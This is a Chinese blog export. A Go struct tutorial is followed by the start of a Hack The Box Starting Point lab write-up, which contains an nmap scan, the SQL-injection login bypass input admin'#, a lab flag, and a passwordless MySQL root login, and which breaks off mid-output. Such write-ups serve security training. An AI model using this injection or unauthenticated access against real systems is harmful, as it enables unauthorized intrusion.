class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">NewPerson</span><span class="hljs-params">(options ...PersonOptions)</span></span> *Person &#123;<br>p:=&amp;Person&#123;&#125;<br><span class="hljs-keyword">for</span> _,option:=<span class="hljs-keyword">range</span> options&#123;<br>option(p)<br>&#125;<br><span class="hljs-keyword">if</span> p.Age&lt;<span class="hljs-number">0</span> &#123;<br>p.Age=<span class="hljs-number">0</span><br>&#125;<br>......<br><br><span class="hljs-keyword">return</span> p<br>&#125;<br></code></pre></td></tr></table></figure><p>对于不同实例化的需求只需要一个构造函数就行，传入不同的 Options 函数</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span>  &#123;<br>p1:=NewPerson(<br>WithName(<span class="hljs-string">&quot;butt3rf1y&quot;</span>),<br>WithAge(<span class="hljs-number">18</span>),<br>WithAddress(<span class="hljs-string">&quot;US&quot;</span>),<br>WithSalary(<span class="hljs-number">100.00</span>),<br>)<br><br>p2:=NewPerson(<br>WithName(<span class="hljs-string">&quot;kikk&quot;</span>),<br>WithAge(<span class="hljs-number">19</span>),<br>)<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="组合"><a href="#组合" class="headerlink" title="组合"></a>组合</h2><p>结构体之间的关系通过组合来表示，有显式组合和匿名组合</p><p>显式组合</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">type</span> Person <span class="hljs-keyword">struct</span> &#123;<br>name <span class="hljs-type">string</span><br>age  <span class="hljs-type">int</span><br>&#125;<br><span class="hljs-keyword">type</span> Student <span class="hljs-keyword">struct</span> &#123;<br>p      Person<br>school <span class="hljs-type">string</span><br>&#125;<br><span class="hljs-keyword">type</span> Employee <span class="hljs-keyword">struct</span> &#123;<br>p   Person<br>job <span class="hljs-type">string</span><br>&#125;<br></code></pre></td></tr></table></figure><p>如果需要显式的指定字段 p</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs go">student:=Student&#123;<br>p:Person&#123;name:<span class="hljs-string">&quot;jack&quot;</span>,age:<span class="hljs-number">18</span>&#125;,<br>school:<span class="hljs-string">&quot;lili school&quot;</span>,<br>&#125;<br>fmt.Println(student.p.name)<br></code></pre></td></tr></table></figure><p>匿名组合</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">type</span> Person <span class="hljs-keyword">struct</span> &#123;<br>name <span class="hljs-type">string</span><br>age <span class="hljs-type">int</span><br>&#125;<br><span class="hljs-keyword">type</span> Student <span class="hljs-keyword">struct</span> &#123;<br>Person<br>school <span class="hljs-type">string</span><br>&#125;<br><span class="hljs-keyword">type</span> Employee <span class="hljs-keyword">struct</span> &#123;<br>Person<br>job <span class="hljs-type">string</span><br>&#125;<br><br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br><span class="hljs-keyword">var</span> user <span class="hljs-keyword">struct</span> &#123;<br>Name <span class="hljs-type">string</span><br>Age  <span class="hljs-type">int</span><br>&#125;<br>user.Name = <span class="hljs-string">&quot;hhah&quot;</span><br>user.Age = <span class="hljs-number">18</span><br>fmt.Printf(<span class="hljs-string">&quot;%#v\n&quot;</span>, user)<br>&#125;<br>&gt;&gt;<br><span class="hljs-keyword">struct</span> &#123; Name <span class="hljs-type">string</span>; Age <span class="hljs-type">int</span> &#125;&#123;Name:<span class="hljs-string">&quot;hhah&quot;</span>, Age:<span class="hljs-number">18</span>&#125;<br></code></pre></td></tr></table></figure><p>匿名字段名称默认为类型名，调用者可以直接访问该类型的字段和方法</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs go">student:=Student&#123;<br>Person:Person&#123;name:<span class="hljs-string">&quot;jack&quot;</span>,age:<span class="hljs-number">18</span>&#125;,<br>school:<span class="hljs-string">&quot;lili school&quot;</span>,<br>&#125;<br>fmt.Println(student.name)<br></code></pre></td></tr></table></figure><h2 id="指针-1"><a href="#指针-1" class="headerlink" title="指针"></a>指针</h2><p>结构体指针不需要解引用就能访问</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br><span class="hljs-keyword">type</span> Person <span class="hljs-keyword">struct</span> &#123;<br>name <span class="hljs-type">string</span><br>age  <span class="hljs-type">int</span><br>&#125;<br>p := &amp;Person&#123;<br>name: <span class="hljs-string">&quot;hhah&quot;</span>,<br>age:  <span class="hljs-number">18</span>,<br>&#125;<br>fmt.Println(p.age, p.name)<br>&#125;<br></code></pre></td></tr></table></figure><p><code>p.age</code> 其实在编译时会转换为 <code>(*p).name</code></p><h2 id="标签"><a href="#标签" class="headerlink" title="标签"></a>标签</h2><p>标签是结构体的元信息，可以在运行时通过反射的机制读取</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-string">`key1:&quot;value1&quot; key2:&quot;value2&quot;`</span><br></code></pre></td></tr></table></figure><p>假如 Student 结构体每个字段定义 json 序列化时用 Tag:</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">type</span> Student <span class="hljs-keyword">struct</span> &#123;<br>ID     <span class="hljs-type">int</span> <span class="hljs-string">`json:&quot;id&quot;`</span><br>Gender <span class="hljs-type">string</span><br>name   <span class="hljs-type">string</span><br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>s1 := Student&#123;<br>ID:     <span class="hljs-number">1</span>,<br>Gender: <span class="hljs-string">&quot;女&quot;</span>,<br>name:   <span class="hljs-string">&quot;hhah&quot;</span>,<br>&#125;<br>data, err := json.Marshal(s1)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>fmt.Println(<span class="hljs-string">&quot;json marshal failed&quot;</span>)<br><span class="hljs-keyword">return</span><br>&#125;<br>fmt.Printf(<span class="hljs-string">&quot;%s\n&quot;</span>, data)<br>&#125;<br>&gt;&gt;<br>&#123;<span class="hljs-string">&quot;id&quot;</span>:<span class="hljs-number">1</span>,<span class="hljs-string">&quot;Gender&quot;</span>:<span class="hljs-string">&quot;女&quot;</span>&#125;<br></code></pre></td></tr></table></figure><h2 id="方法和接收者"><a href="#方法和接收者" class="headerlink" title="方法和接收者"></a>方法和接收者</h2><p>方法（Method）是作用于特定类型变量的函数，特定类型变量叫接收者 (Receiver) </p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(Receiver变量 Receiver类型)</span></span> 方法名(参数列表) (返回参数)&#123;<br>函数体<br>&#125;<br></code></pre></td></tr></table></figure><p>比如说</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">type</span> Person <span class="hljs-keyword">struct</span> &#123;<br>name <span class="hljs-type">string</span><br>age  <span class="hljs-type">int8</span><br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">NewPerson</span><span class="hljs-params">(name <span class="hljs-type">string</span>, age <span class="hljs-type">int8</span>)</span></span> *Person &#123;<br><span class="hljs-keyword">return</span> &amp;Person&#123;<br>name: name,<br>age:  age,<br>&#125;<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(p Person)</span></span> Dream() &#123;<br>fmt.Printf(<span class="hljs-string">&quot;%s&quot;</span>, p.name)<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>p1 := NewPerson(<span class="hljs-string">&quot;hhah&quot;</span>, <span class="hljs-number">18</span>)<br>p1.Dream()<br>&#125;<br>&gt;&gt;<br>hhah<br></code></pre></td></tr></table></figure><h3 id="指针类型的接收者"><a href="#指针类型的接收者" class="headerlink" title="指针类型的接收者"></a>指针类型的接收者</h3><p>由于指针的特性，调用方法时修改接收者指针的任意成员变量，方法结束后修改也有效。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(p *Person)</span></span> SetAge(newAge <span class="hljs-type">int8</span>) &#123;<br>p.age = newAge<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>p1 := NewPerson(<span class="hljs-string">&quot;cc&quot;</span>, <span class="hljs-number">18</span>)<br>fmt.Println(p1.age)<br>p1.SetAge(<span class="hljs-number">20</span>)<br>fmt.Println(p1.age)<br>&#125;<br>&gt;&gt;<br><span class="hljs-number">18</span><br><span class="hljs-number">20</span><br></code></pre></td></tr></table></figure><p>一般需要修改接收者中的值或者如果某个方法使用了指针接收者时用指针类型接收者</p><h3 id="值类型的接收者"><a href="#值类型的接收者" class="headerlink" title="值类型的接收者"></a>值类型的接收者</h3><p>当方法用于值类型接收者时，会在代码运行时将值复制一份。在值类型接收者的方法中可以获取接收者的成员值，但无法改变接收者本身</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(p Person)</span></span> SetAge(newAge <span class="hljs-type">int8</span>) &#123;<br>p.age = newAge<br><br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(p Person)</span></span> Dream() &#123;<br><br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>p1 := NewPerson(<span class="hljs-string">&quot;hhah&quot;</span>, <span class="hljs-number">18</span>)<br>p1.Dream()<br>fmt.Println(p1.age)<br>p1.SetAge(<span class="hljs-number">20</span>)<br>fmt.Println(p1.age)<br>&#125;<br>&gt;&gt;<br><span class="hljs-number">18</span><br><span class="hljs-number">18</span><br></code></pre></td></tr></table></figure><h3 id="任意类型添加方法"><a href="#任意类型添加方法" class="headerlink" title="任意类型添加方法"></a>任意类型添加方法</h3><p>接收者可以是任意类型，不仅仅是结构体，任何类型都可以拥有方法</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">type</span> MyInt <span class="hljs-type">int</span><span class="hljs-comment">//将 int 定义为 MyInt 类型</span><br><br><span class="hljs-comment">//为 MyInt 添加一个 SayHello 方法</span><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(m MyInt)</span></span> SayHello() &#123;<br>fmt.Println(<span class="hljs-string">&quot;hello&quot;</span>)<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br><span class="hljs-keyword">var</span> m1 MyInt<br>m1.SayHello()<br>m1 = <span class="hljs-number">100</span><br>fmt.Printf(<span class="hljs-string">&quot;%#v %T\n&quot;</span>, m1, m1)<br>&#125;<br>&gt;&gt;<br>hello<br><span class="hljs-number">100</span> main.MyInt<br></code></pre></td></tr></table></figure><p><strong>不能给别的包的类型定义方法</strong></p><h2 id="嵌套"><a href="#嵌套" class="headerlink" title="嵌套"></a>嵌套</h2><p>一个结构体可以嵌套另一个结构体或结构体指针</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">type</span> Address <span class="hljs-keyword">struct</span> &#123;<br>Province <span class="hljs-type">string</span><br>city     <span class="hljs-type">string</span><br>&#125;<br><br><span class="hljs-keyword">type</span> User <span class="hljs-keyword">struct</span> &#123;<br>Name    <span class="hljs-type">string</span><br>Gender  <span class="hljs-type">string</span><br>Address Address<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>user1 := User&#123;<br>Name:   <span class="hljs-string">&quot;hhah&quot;</span>,<br>Gender: <span class="hljs-string">&quot;w&quot;</span>,<br>Address: Address&#123;<br>Province: <span class="hljs-string">&quot;四川&quot;</span>,<br>city:     <span class="hljs-string">&quot;成都&quot;</span>,<br>&#125;,<br>&#125;<br>fmt.Printf(<span class="hljs-string">&quot;user1=%#v\n&quot;</span>, user1)<br>&#125;<br>&gt;&gt;<br>user1=main.User&#123;Name:<span class="hljs-string">&quot;hhah&quot;</span>, Gender:<span class="hljs-string">&quot;w&quot;</span>, Address:main.Address&#123;Province:<span class="hljs-string">&quot;四川&quot;</span>, city:<span class="hljs-string">&quot;成都&quot;</span>&#125;&#125;<br></code></pre></td></tr></table></figure><h3 id="嵌套匿名结构体"><a href="#嵌套匿名结构体" class="headerlink" title="嵌套匿名结构体"></a>嵌套匿名结构体</h3><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">type</span> Address <span class="hljs-keyword">struct</span> &#123;<br>Province <span class="hljs-type">string</span><br>city     <span class="hljs-type">string</span><br>&#125;<br><br><span class="hljs-keyword">type</span> User <span class="hljs-keyword">struct</span> &#123;<br>Name   <span class="hljs-type">string</span><br>Gender <span class="hljs-type">string</span><br>Address<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br><span class="hljs-keyword">var</span> user2 User<br>user2.Name = <span class="hljs-string">&quot;cc&quot;</span><br>user2.Gender = <span class="hljs-string">&quot;w&quot;</span><br>user2.Address.Province = <span class="hljs-string">&quot;四川&quot;</span><br>user2.city = <span class="hljs-string">&quot;成都&quot;</span><br>fmt.Printf(<span class="hljs-string">&quot;user2=%#v\n&quot;</span>, user2)<br>&#125;<br>&gt;&gt;<br>user2=main.User&#123;Name:<span class="hljs-string">&quot;cc&quot;</span>, Gender:<span class="hljs-string">&quot;w&quot;</span>, Address:main.Address&#123;Province:<span class="hljs-string">&quot;四川&quot;</span>, city:<span class="hljs-string">&quot;成都&quot;</span>&#125;&#125;<br></code></pre></td></tr></table></figure><h2 id="内存对齐"><a href="#内存对齐" class="headerlink" title="内存对齐"></a>内存对齐</h2><p>结构体字段的内存分布遵循内存对齐的规则</p>]]></content>
    
    
    <categories>
      
      <category>语言</category>
      
      <category>Go</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Go</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>HTB-StartingPoint</title>
    <link href="/2025/03/06/StartingPoint/"/>
    <url>/2025/03/06/StartingPoint/</url>
    
    <content type="html"><![CDATA[<p>终于把 StartingPoint 打完了（累了）</p><span id="more"></span><h1 id="Tier-0"><a href="#Tier-0" class="headerlink" title="Tier 0"></a>Tier 0</h1><p>比较简单就没写</p><h1 id="Tier-1"><a href="#Tier-1" class="headerlink" title="Tier 1"></a>Tier 1</h1><h2 id="Appoinment"><a href="#Appoinment" class="headerlink" title="Appoinment"></a>Appoinment</h2><h3 id="Task-1"><a href="#Task-1" class="headerlink" title="Task  1"></a>Task  1</h3><figure class="highlight mathematica"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs mathematica"><span class="hljs-variable">What</span> <span class="hljs-variable">does</span> <span class="hljs-variable">the</span> <span class="hljs-variable">acronym</span> <span class="hljs-variable">SQL</span> <span class="hljs-variable">stand</span> <span class="hljs-variable">for</span><span class="hljs-operator">?</span><br><span class="hljs-operator">:</span><span class="hljs-variable">Structured</span> <span class="hljs-built_in">Query</span> <span class="hljs-built_in">Language</span><br></code></pre></td></tr></table></figure><h3 id="Task-2"><a href="#Task-2" class="headerlink" title="Task 2"></a>Task 2</h3><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">What <span class="hljs-keyword">is</span> one <span class="hljs-keyword">of</span> the most common <span class="hljs-keyword">type</span> <span class="hljs-keyword">of</span> <span class="hljs-keyword">SQL</span> vulnerabilities?<br>:<span class="hljs-keyword">SQL</span> injection<br></code></pre></td></tr></table></figure><h3 id="Task-3"><a href="#Task-3" class="headerlink" title="Task 3"></a>Task 3</h3><figure class="highlight kotlin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs kotlin">What <span class="hljs-keyword">is</span> the <span class="hljs-number">2021</span> OWASP Top <span class="hljs-number">10</span> classification <span class="hljs-keyword">for</span> <span class="hljs-keyword">this</span> vulnerability?<br>:A03:<span class="hljs-number">2021</span>-Injection<br></code></pre></td></tr></table></figure><h3 id="Task-4"><a href="#Task-4" class="headerlink" title="Task 4"></a>Task 4</h3><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs cmd">┌──(root㉿butt3rf1y)-[/home/butt3rf1y]<br>└─# nmap -sS -sV -Pn <span class="hljs-number">10</span>.<span class="hljs-number">129</span>.<span class="hljs-number">84</span>.<span class="hljs-number">247</span><br>Starting Nmap <span class="hljs-number">7</span>.<span class="hljs-number">94</span>SVN ( https://nmap.org ) <span class="hljs-built_in">at</span> <span class="hljs-number">2025</span>-<span class="hljs-number">02</span>-<span class="hljs-number">19</span> <span class="hljs-number">00</span>:<span class="hljs-number">37</span> CST<br>Nmap scan report <span class="hljs-keyword">for</span> <span class="hljs-number">10</span>.<span class="hljs-number">129</span>.<span class="hljs-number">84</span>.<span class="hljs-number">247</span><br>Host is up (<span class="hljs-number">0</span>.<span class="hljs-number">60</span>s latency).<br><span class="hljs-keyword">Not</span> shown: <span class="hljs-number">999</span> closed tcp ports (reset)<br>PORT   STATE SERVICE VERSION<br><span class="hljs-number">80</span>/tcp open  http    Apache httpd <span class="hljs-number">2</span>.<span class="hljs-number">4</span>.<span class="hljs-number">38</span> ((Debian))<br><br>Service detection performed. Please report any incorrect results <span class="hljs-built_in">at</span> https://nmap.org/submit/ .<br>Nmap done: <span class="hljs-number">1</span> IP address (<span class="hljs-number">1</span> host up) scanned <span class="hljs-keyword">in</span> <span class="hljs-number">15</span>.<span class="hljs-number">07</span> seconds<br></code></pre></td></tr></table></figure><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs applescript">What <span class="hljs-keyword">does</span> Nmap report <span class="hljs-keyword">as</span> <span class="hljs-keyword">the</span> service <span class="hljs-keyword">and</span> <span class="hljs-built_in">version</span> <span class="hljs-keyword">that</span> are <span class="hljs-built_in">running</span> <span class="hljs-keyword">on</span> port <span class="hljs-number">80</span> <span class="hljs-keyword">of</span> <span class="hljs-keyword">the</span> target?<br>: Apache httpd <span class="hljs-number">2.4</span><span class="hljs-number">.38</span> ((Debian))<br></code></pre></td></tr></table></figure><h3 id="Task-5"><a href="#Task-5" class="headerlink" title="Task 5"></a>Task 5</h3><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver">What is <span class="hljs-keyword">the</span> standard port used <span class="hljs-keyword">for</span> <span class="hljs-keyword">the</span> HTTPS protocol?<br>:<span class="hljs-number">443</span><br></code></pre></td></tr></table></figure><h3 id="Task-6"><a href="#Task-6" class="headerlink" title="Task 6"></a>Task 6</h3><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver">What is <span class="hljs-keyword">a</span> <span class="hljs-built_in">folder</span> called <span class="hljs-keyword">in</span> web-application terminology?<br>:<span class="hljs-built_in">directory</span><br></code></pre></td></tr></table></figure><h3 id="Task-7"><a href="#Task-7" class="headerlink" title="Task 7"></a>Task 7</h3><figure class="highlight ceylon"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs ceylon">What <span class="hljs-keyword">is</span> the HTTP response code <span class="hljs-keyword">is</span> <span class="hljs-keyword">given</span> <span class="hljs-keyword">for</span> <span class="hljs-string">&#x27;Not Found&#x27;</span> errors?<br>:<span class="hljs-number">404</span><br></code></pre></td></tr></table></figure><h3 id="Task-8"><a href="#Task-8" class="headerlink" title="Task 8"></a>Task 8</h3><figure class="highlight vhdl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs vhdl">Gobuster <span class="hljs-keyword">is</span> one tool used <span class="hljs-keyword">to</span> brute <span class="hljs-keyword">force</span> directories <span class="hljs-keyword">on</span> a webserver. What switch do we <span class="hljs-keyword">use</span> <span class="hljs-keyword">with</span> Gobuster <span class="hljs-keyword">to</span> specify we<span class="hljs-symbol">&#x27;re</span> looking <span class="hljs-keyword">to</span> discover directories, <span class="hljs-keyword">and</span> <span class="hljs-keyword">not</span> subdomains?<br>:dir<br></code></pre></td></tr></table></figure><h3 id="Task-9"><a href="#Task-9" class="headerlink" title="Task 9"></a>Task 9</h3><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver">What single <span class="hljs-keyword">character</span> can be used <span class="hljs-built_in">to</span> comment out <span class="hljs-keyword">the</span> rest <span class="hljs-keyword">of</span> <span class="hljs-keyword">a</span> <span class="hljs-built_in">line</span> <span class="hljs-keyword">in</span> MySQL?<br>:<span class="hljs-comment">#</span><br></code></pre></td></tr></table></figure><h3 id="Task-10"><a href="#Task-10" class="headerlink" title="Task 10"></a>Task 10</h3><p>直接访问 80 端口，一个登录框输入 <code>admin&#39;#</code></p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">If</span> <span class="hljs-keyword">user</span> <span class="hljs-keyword">input</span> <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> handled carefully, it could be interpreted <span class="hljs-keyword">as</span> a <span class="hljs-keyword">comment</span>. Use a <span class="hljs-keyword">comment</span> <span class="hljs-keyword">to</span> <span class="hljs-keyword">login</span> <span class="hljs-keyword">as</span> <span class="hljs-keyword">admin</span> <span class="hljs-keyword">without</span> knowing the <span class="hljs-keyword">password</span>. What <span class="hljs-keyword">is</span> the first word <span class="hljs-keyword">on</span> the webpage returned?<br>:Congratulations!<br></code></pre></td></tr></table></figure><h3 id="Submit-Flag"><a href="#Submit-Flag" class="headerlink" title="Submit Flag"></a>Submit Flag</h3><figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs armasm"><span class="hljs-keyword">Submit</span> root flag<br>:e3d0796d002a446c0e622226f42e9672<br></code></pre></td></tr></table></figure><h2 id="Sequel"><a href="#Sequel" class="headerlink" title="Sequel"></a>Sequel</h2><h3 id="Task-1-1"><a href="#Task-1-1" class="headerlink" title="Task 1"></a>Task 1</h3><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs routeros">During our scan, which<span class="hljs-built_in"> port </span><span class="hljs-keyword">do</span> we <span class="hljs-built_in">find</span> serving MySQL?<br>:3306<br></code></pre></td></tr></table></figure><h3 id="Task-2-1"><a href="#Task-2-1" class="headerlink" title="Task 2"></a>Task 2</h3><p>扫了半天扫不出来，准确来说扫不动，一扫就卡，可以直接连接</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">┌──(root㉿butt3rf1y)-[/home/butt3rf1y]<br>└─# mysql -h <span class="hljs-number">10.129</span><span class="hljs-number">.141</span><span class="hljs-number">.247</span> -P <span class="hljs-number">3306</span> -uroot<br><span class="hljs-built_in">WARNING</span>: <span class="hljs-keyword">option</span> <span class="hljs-comment">--ssl-verify-server-cert is disabled, because of an insecure passwordless login.</span><br>Welcome 